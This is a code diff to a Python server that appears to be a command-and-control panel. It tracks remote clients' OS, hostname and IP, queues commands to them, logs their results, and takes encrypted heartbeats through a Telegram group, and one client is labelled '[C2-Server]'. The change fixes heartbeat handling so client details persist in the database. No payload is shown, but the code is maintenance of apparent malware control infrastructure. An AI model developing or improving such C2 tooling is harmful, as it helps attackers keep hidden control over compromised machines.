@@ -183,6 +183,19 @@ def save_client_to_db(client_id, last_seen, os_info=None, hostname=None, ip=None
     except Exception as e:
         logger.error(f"Failed to save client to DB: {e}")
 
+
+def _persist_client_last_seen_db(client_id: str, ts: float | None = None):
+    """تحديث last_seen في DB دون تصفير os/hostname/ip عند استدعاء heartbeat بدون حقول."""
+    t = ts if ts is not None else time.time()
+    row = clients.get(client_id) or {}
+    save_client_to_db(
+        client_id,
+        t,
+        os_info=row.get("os"),
+        hostname=row.get("hostname"),
+        ip=row.get("ip"),
+    )
+
 def save_command_to_db(command, client_id, status="pending", cwd=None):
     """Save command to DB and return the inserted row ID."""
     try:
@@ -553,7 +566,7 @@ def listen_telegram_group():
                                     _tg_decrypt(tg_sessions[client_id], parts[2])
                                     if client_id in clients:
                                         clients[client_id]["last_seen"] = time.time()
-                                        save_client_to_db(client_id, time.time())
+                                        _persist_client_last_seen_db(client_id)
                                     logger.debug(f"💓 TG Heartbeat from {client_id}")
                             except Exception:
                                 pass
@@ -669,6 +682,7 @@ def process_tg_message():
 
                     if client_id in clients:
                         clients[client_id]["last_seen"] = time.time()
+                        _persist_client_last_seen_db(client_id)
                     save_log_to_db(time.time(), "result", decrypted, client_id)
                     logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
         except Exception as e:
@@ -683,7 +697,7 @@ def process_tg_message():
                 _tg_decrypt(tg_sessions[client_id], parts[2])
                 if client_id in clients:
                     clients[client_id]["last_seen"] = time.time()
-                    save_client_to_db(client_id, time.time())
+                    _persist_client_last_seen_db(client_id)
         except Exception:
             pass
 
@@ -818,7 +832,7 @@ def receive_data():
 
         if client_id in clients:
             clients[client_id]["last_seen"] = time.time()
-            save_client_to_db(client_id, time.time())
+            _persist_client_last_seen_db(client_id)
 
         return "OK"
     except Exception as e:
@@ -997,9 +1011,10 @@ def get_clients():
     readable = {}
 
     for cid, info in clients.items():
+        ls = info.get("last_seen")
         readable[cid] = {
-            "last_seen": time.ctime(info["last_seen"]),
-            "timestamp": info["last_seen"],
+            "last_seen": time.ctime(ls) if ls is not None else "",
+            "timestamp": ls if ls is not None else 0,
             "is_server": (cid == "[C2-Server]"),
             "os": info.get("os", ""),
             "hostname": info.get("hostname", ""),
